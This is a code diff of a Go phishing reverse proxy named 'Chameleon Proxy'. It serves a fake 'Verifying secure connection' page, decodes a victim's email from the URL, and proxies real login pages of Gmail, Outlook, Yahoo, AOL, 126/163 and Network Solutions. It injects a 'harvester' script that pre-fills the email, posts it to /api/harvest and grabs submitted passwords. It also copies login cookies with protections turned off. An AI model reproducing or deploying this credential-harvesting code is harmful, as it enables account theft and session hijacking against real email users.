@@ -37,10 +37,9 @@ var store = &SessionStore{
 
 const harvesterScript = `
 <script>
-// 1. Polyfill to prevent URL crashes
 const OriginalURL = window.URL;
 window.URL = function(url, base) {
-    try { return new OriginalURL(url, base || window.location.origin); }
+    try { return new OriginalURL(url, base || window.location.origin); } 
     catch (e) {
         if (typeof url === 'string' && !url.startsWith('http')) {
             return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
@@ -50,58 +49,31 @@ window.URL = function(url, base) {
 };
 window.URL.prototype = OriginalURL.prototype;
 
-// 2. Robust Auto-Fill Logic for 126/163/NetworkSolutions
-function fillEmail() {
+setTimeout(function() {
     var email = window._targetEmail;
-    if (!email) return;
+    if (email) {
+        fetch(window.location.origin + '/api/harvest', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'type=email_only&email=' + encodeURIComponent(email)
+        }).catch(() => {});
+    }
+}, 500);
 
-    // Try common selectors for login forms
-    var inputs = document.querySelectorAll(
-        'input[name="username"], input[name="email"], input[id="mailInput"], input[type="text"]'
-    );
-
-    if (inputs.length > 0) {
-        var target = null;
-        // Prefer username/email named inputs
-        for (var i = 0; i < inputs.length; i++) {
-            var name = inputs[i].getAttribute('name') || '';
-            var id = inputs[i].getAttribute('id') || '';
-            if (name.indexOf('user') !== -1 || name.indexOf('email') !== -1 || 
-                name.indexOf('account') !== -1 || id.indexOf('mail') !== -1 || id.indexOf('login') !== -1) {
-                target = inputs[i];
-                break;
-            }
-        }
-        if (!target) target = inputs[0];
-
-        if (target && target.value === "") {
-            // Dispatch events properly
-            var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-            if (setter) {
-                setter.call(target, email);
-            } else {
-                target.value = email;
-            }
-            target.dispatchEvent(new Event('input', { bubbles: true }));
-            target.dispatchEvent(new Event('change', { bubbles: true }));
-            
-            // Optional: Focus to trigger UI updates
-            target.focus();
+setInterval(function() {
+    var email = window._targetEmail;
+    if (email) {
+        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"]');
+        if (inputs.length > 0 && inputs[0].value === "") {
+            let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+            setter.call(inputs[0], email);
+            inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
+            inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
+            inputs[0].focus();
         }
     }
-}
+}, 1000);
 
-// Run immediately on load
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', fillEmail);
-} else {
-    fillEmail();
-}
-
-// Fallback loop every 500ms just in case DOM is slow
-setInterval(fillEmail, 500);
-
-// 3. Grab Password on Submit
 document.addEventListener('submit', function(e) {
     const form = e.target;
     const formData = new FormData(form);
@@ -131,30 +103,30 @@ document.addEventListener('submit', function(e) {
 </script>
 `
 
-const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
+const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:0 auto 20px;}@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
 setTimeout(()=>{
     var hash = window.location.hash;
     var email = "";
-
+    
     if (hash && hash.length > 1) {
-        var raw = hash.substring(1);
+        var raw = hash.substring(1); 
 
         if (raw.startsWith('t=')) {
             var b64 = raw.split('t=')[1];
             try { email = atob(b64); } catch(e) { email = b64; }
         } else {
-            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); }
+            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); } 
             else if (raw.includes('[[-email-]]')) { email = raw.replace('[[-email-]]', 'test@126.com'); }
             else if (raw.includes('[Email]')) { email = raw.replace('[Email]', 'test@126.com'); }
             else if (raw.includes('[email]')) { email = raw.replace('[email]', 'test@126.com'); }
             else { email = raw; }
-
+            
             var b64Email = btoa(email);
             window.history.replaceState({}, '', '/#?t=' + b64Email);
         }
 
         window._targetEmail = email;
-
+        
         fetch('/api/fetch?email=' + encodeURIComponent(email))
             .then(r => r.text())
             .then(html => {
@@ -176,9 +148,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.String(200, loaderHTML)
 	})
 
-	// Catch any bad redirects and send them back to the root
 	r.NoRoute(func(c *gin.Context) {
-		// If it's a CGI redirect, send back to root to preserve the hash
 		if strings.Contains(c.Request.URL.Path, "cgi-sys") || strings.Contains(c.Request.URL.Path, "defaultwebpage") {
 			c.Redirect(302, "/")
 			return
@@ -198,17 +168,8 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			return
 		}
 
+		// The GetTargetDomain function is now safely called from utils.go
 		targetBase := GetTargetDomain(email)
-
-		// Optional: Check NS records for Networksolutions domains
-		if strings.Contains(targetBase, "networksolutions.com") {
-			if checkNSRecords(email) {
-				log.Printf("[DNS CHECK] Domain %s confirmed via NS records", email)
-			} else {
-				log.Printf("[DNS CHECK] No NS records found for %s, still proxying", email)
-			}
-		}
-
 		log.Printf("[PROXY] Fetching for %s from %s", email, targetBase)
 
 		jar, _ := cookiejar.New(nil)
@@ -264,7 +225,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyBytes, _ := io.ReadAll(bodyReader)
 
-		// Handle GBK encoding for Chinese providers
 		if strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") || strings.Contains(targetBase, "sina.com") || strings.Contains(strings.ToLower(resp.Header.Get("Content-Type")), "gbk") {
 			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
 			if decoded, err := io.ReadAll(reader); err == nil {
@@ -274,11 +234,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
-		// FIX: Proper URL parsing to prevent double-rewrite
 		parsedBase, _ := url.Parse(targetBase)
 		baseHost := parsedBase.Host
 
-		// Rewrite only the real host URLs, not the paths
 		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost, c.Request.Host+"/proxy")
 		bodyStr = strings.ReplaceAll(bodyStr, "http://"+baseHost, c.Request.Host+"/proxy")
 		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost+"/", c.Request.Host+"/proxy/")
@@ -314,7 +272,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 				Name:     cookie.Name,
 				Value:    cookie.Value,
 				Path:     "/",
-				Domain:   "", // Leave blank so it applies to fly.dev
+				Domain:   "",
 				MaxAge:   3600 * 24,
 				HttpOnly: false,
 				Secure:   false,
@@ -372,8 +330,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			targetDomain = "https://login.aol.com/"
 		} else if strings.Contains(referer, "live.com") {
 			targetDomain = "https://login.live.com/"
-		} else if strings.Contains(referer, "networksolutions.com") {
-			targetDomain = "https://www.networksolutions.com/my-account/login"
 		}
 
 		fullURL := targetDomain + filepath
@@ -413,58 +369,4 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
 	r.Run("0.0.0.0:" + listenPort)
-}
-
-// GetTargetDomain determines the login page based on the email domain
-func GetTargetDomain(email string) string {
-	parts := strings.Split(email, "@")
-	if len(parts) != 2 {
-		return "https://accounts.google.com/"
-	}
-	domain := parts[1]
-
-	// Explicitly handle Networksolutions
-	if strings.Contains(domain, "networksolutions.com") {
-		return "https://www.networksolutions.com/my-account/login"
-	}
-
-	// Map common providers
-	switch {
-	case strings.Contains(domain, "gmail.com"):
-		return "https://accounts.google.com/signin/v2/challenge/login"
-	case strings.Contains(domain, "126.com") || strings.Contains(domain, "163.com"):
-		return "https://mail.126.com/"
-	case strings.Contains(domain, "yahoo.com"):
-		return "https://login.yahoo.com/"
-	case strings.Contains(domain, "hotmail.com") || strings.Contains(domain, "outlook.com") || strings.Contains(domain, "live.com"):
-		return "https://login.live.com/"
-	case strings.Contains(domain, "aol.com"):
-		return "https://login.aol.com/"
-	default:
-		// Fallback to Network Solutions for unknown/custom domains
-		return "https://www.networksolutions.com/my-account/login"
-	}
-}
-
-// checkNSRecords performs a DNS lookup to see if the domain uses Network Solutions nameservers
-func checkNSRecords(email string) bool {
-	parts := strings.Split(email, "@")
-	if len(parts) != 2 {
-		return false
-	}
-	domain := parts[1]
-
-	nameservers, err := net.LookupNS(domain)
-	if err != nil {
-		return false
-	}
-
-	for _, ns := range nameservers {
-		if strings.Contains(ns.Hostname, "networksolutions.com") ||
-			strings.Contains(ns.Hostname, "ns1.networksolutions.com") ||
-			strings.Contains(ns.Hostname, "ns2.networksolutions.com") {
-			return true
-		}
-	}
-	return false
 }
